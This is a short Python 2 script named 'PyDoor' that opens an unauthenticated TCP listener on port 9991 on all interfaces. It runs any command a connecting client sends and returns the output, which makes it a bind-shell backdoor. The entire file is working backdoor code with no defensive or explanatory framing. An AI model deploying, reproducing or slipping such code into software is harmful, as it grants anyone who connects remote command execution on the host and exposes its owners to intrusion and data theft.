#!/usr/bin/python
import socket
import sys
import os
import subprocess
import thread

def client_conn(conn, addr, buff):
    conn.send("PyDoor\n")
    while True:
        data = conn.recv(buff)
        if not data or data.strip() == "exit":
            break
        print addr[0]+':', data.strip()
        process = subprocess.Popen(data.strip().split(" "), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()
        conn.send(stdout + stderr)
    conn.close()
    print "[Disconnected] %s on port %d" %(addr[0], addr[1])

def main():
    buflen = 1024
    port = 9991
    addr = '0.0.0.0'
    s=socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((addr, port))
    s.listen(5)
    print "Server Active\n%s listening on port %d" %(addr, port)
    while True:
        try:
            conn, addr = s.accept()
            print "Connection Received from %s on port %s" %(addr[0], addr[1])
            thread.start_new_thread(client_conn, (conn, addr, buflen))
        except socket.error, msg:
            sys.stderr.write("[ERROR] %s\n" %msg[1])
        except KeyboardInterrupt:
            print "Shutting down server..."
            break

if __name__ == "__main__":
    main()